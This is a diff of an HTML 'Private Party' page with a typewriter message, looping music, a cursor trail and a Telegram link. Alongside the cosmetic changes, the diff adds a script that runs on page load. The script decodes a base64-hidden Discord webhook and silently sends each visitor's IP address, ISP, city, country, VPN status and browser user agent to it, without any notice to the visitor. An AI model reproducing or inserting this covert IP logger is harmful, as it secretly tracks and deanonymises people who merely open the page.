@@ -4,111 +4,135 @@
 <meta charset="UTF-8">
 <title>Private Party</title>
 <style>
-body{
-    background:#000;
-    color:#999;
-    font-family:"Courier New", monospace;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    height:100vh;
-    margin:0;
-    user-select:none;
-    overflow:hidden;
-    cursor:none;
+body {
+    background: #000;
+    color: #999;
+    font-family: "Courier New", monospace;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+    margin: 0;
+    user-select: none;
+    overflow: hidden;
+    cursor: none;
 }
-#text{
-    font-size:1.3rem;
-    letter-spacing:2px;
-    white-space:pre;
-    position:relative;
+#text {
+    font-size: 1.3rem;
+    letter-spacing: 2px;
+    white-space: pre;
 }
-.trail{
-    position:absolute;
-    width:3px;
-    height:3px;
-    background:#999;
-    border-radius:50%;
-    pointer-events:none;
-    opacity:0;
-    transition:opacity 0.2s;
+.trail {
+    position: absolute;
+    width: 4px;
+    height: 4px;
+    background: #999;
+    border-radius: 50%;
+    pointer-events: none;
+    opacity: 0;
+    transition: opacity 0.3s, transform 0.1s;
 }
-#sadface{
-    position:fixed;
-    bottom:10px;
-    left:10px;
-    color:#999;
-    font-family:"Courier New", monospace;
-    cursor:pointer;
-    font-size:1.2rem;
-    user-select:none;
-    transition:color 0.2s;
+#sadface {
+    position: fixed;
+    bottom: 10px;
+    left: 10px;
+    color: #999;
+    cursor: pointer;
+    font-size: 1.4rem;
+    transition: color 0.2s;
 }
-#sadface:hover{
-    color:#fff;
-}
+#sadface:hover { color: #fff; }
 </style>
 </head>
 <body>
-<div id="text">\u200B</div>
+
+<div id="text"></div>
 <div id="sadface">:(</div>
 
 <audio id="bgmusic" loop>
-<source src="Volare.mp3" type="audio/mpeg">
+    <source src="Volare.mp3" type="audio/mpeg">
 </audio>
 
 <script>
-// typewriter effect
-const message="we never condoned violence";
-const text=document.getElementById("text");
-text.textContent="\u200B"; 
-let i=0;
-function type(){
-    if(i<message.length){
-        text.textContent+=message[i];
-        i++;
-        setTimeout(type, 80 + Math.random()*40);
+// ---------------------- Typing Effect ----------------------
+const msg = "we never condoned violence";
+const display = document.getElementById("text");
+let idx = 0;
+
+function startTyping() {
+    if (idx < msg.length) {
+        display.textContent += msg[idx];
+        idx++;
+        setTimeout(startTyping, 100);
     }
 }
-type();
+startTyping();
 
-// background audio: starts on interaction
-const audio = document.getElementById("bgmusic");
-function startAudio(){ 
-    audio.play(); 
-    document.removeEventListener("mousemove", startAudio); 
-    document.removeEventListener("click", startAudio);
-}
-document.addEventListener("mousemove", startAudio);
-document.addEventListener("click", startAudio);
+// ---------------------- Play Music on First Click ----------------------
+document.addEventListener("mousedown", () => {
+    const music = document.getElementById("bgmusic");
+    music.play().catch(() => {
+        console.warn("Autoplay blocked");
+    });
+}, { once: true });
 
-// minimal cursor trail
-const trail = [];
-const trailLength = 25;
-for(let j=0; j<trailLength; j++){
+// ---------------------- Cursor Trail ----------------------
+const dots = [];
+const trailCount = 15;
+for (let i = 0; i < trailCount; i++) {
     const dot = document.createElement("div");
     dot.className = "trail";
     document.body.appendChild(dot);
-    trail.push(dot);
+    dots.push(dot);
 }
-let t=0;
-document.addEventListener("mousemove", e=>{
-    const dot = trail[t];
-    dot.style.left = (e.pageX - 1.5) + "px";
-    dot.style.top = (e.pageY - 1.5) + "px";
+let currentDot = 0;
+document.addEventListener("mousemove", e => {
+    const dot = dots[currentDot];
+    dot.style.left = `${e.pageX - 2}px`;
+    dot.style.top = `${e.pageY - 2}px`;
     dot.style.opacity = 1;
-    setTimeout(()=>{ dot.style.opacity = 0; }, 300);
-    t = (t+1) % trailLength;
+    dot.style.transform = "scale(1)";
+    setTimeout(() => { dot.style.opacity = 0; dot.style.transform = "scale(0.5)"; }, 300);
+    currentDot = (currentDot + 1) % trailCount;
 });
 
-// disable right-click / selection
-document.addEventListener("contextmenu", e=>e.preventDefault());
-document.addEventListener("selectstart", e=>e.preventDefault());
+// ---------------------- Visitor Logging ----------------------
+(async function logVisitor() {
+    const webhookUrl = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3OTI4NDU5OTkyNTUxMDMxNi9fSUNlaHhHbW9pVXZ4akJjT0dvLWt1WURLQW5venlic2pxNXBoemVDUTR4Y0JTWUhEbXBwLXBsYmFkQnNYZFRrVnY=");
+    try {
+        const ipRes = await fetch("https://ipapi.co/json/");
+        const data = await ipRes.json();
 
-// sad face click
-document.getElementById("sadface").addEventListener("click", () => {
-    window.open("https://t.me/publicpartys", "_blank");
-});
+        const isVpn = (data.proxy || data.hosting || (data.org && data.org.toLowerCase().includes("vpn"))) ? "Yes" : "No";
+
+        await fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                embeds: [{
+                    title: "💀 New Visitor Logged",
+                    color: 0,
+                    fields: [
+                        { name: "🛡️ VPN/Proxy", value: `\`${isVpn}\``, inline: true },
+                        { name: "🌐 Connection", value: `**IP:** \`${data.ip}\`\n**ISP:** \`${data.org || "Unknown"}\``, inline: false },
+                        { name: "📍 Location", value: `\`${data.city}, ${data.country_name}\``, inline: true },
+                        { name: "💻 User Agent", value: `\`\`\`bash\n${navigator.userAgent}\n\`\`\``, inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            })
+        });
+    } catch (err) {
+        console.error("Visitor logging failed", err);
+    }
+})();
+
+// ---------------------- Block Right Click ----------------------
+document.addEventListener("contextmenu", e => e.preventDefault());
+
+// ---------------------- Telegram Link ----------------------
+document.getElementById("sadface").onclick = () => window.open("https://t.me/publicpartys", "_blank");
+
 </script>
 </body>
 </html>
